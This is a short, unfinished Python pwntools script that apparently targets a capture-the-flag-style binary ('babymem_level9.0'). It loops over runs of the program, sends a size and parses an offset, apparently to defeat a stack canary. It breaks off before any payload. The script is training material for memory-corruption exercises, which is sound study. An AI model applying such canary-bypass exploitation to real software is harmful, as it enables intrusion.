from pwn import *

file = "/challenge/babymem_level9.0"
canaryfound = False

for i in range(256):
    p = process(file)
    p.sendline(b'88')
    while not canaryfound:
        p.recvuntil(b'this is ')
        offset = p.recvline()
        offset = int(offset[:1])
